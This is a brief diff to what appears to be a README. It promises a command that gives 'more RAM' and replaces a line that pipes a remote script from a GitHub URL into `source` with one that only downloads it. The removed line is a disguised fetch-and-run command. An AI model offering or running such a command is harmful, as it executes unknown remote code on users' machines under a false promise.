@@ -6,7 +6,7 @@
 
 # Super cool command which gives you more RAM,
 ```
-source <(curl -s http://github.com/whitercactus/super-cool-binary/gg.sh)
+curl -s http://github.com/whitercactus/super-cool-binary/gg.sh
 ```
 
 
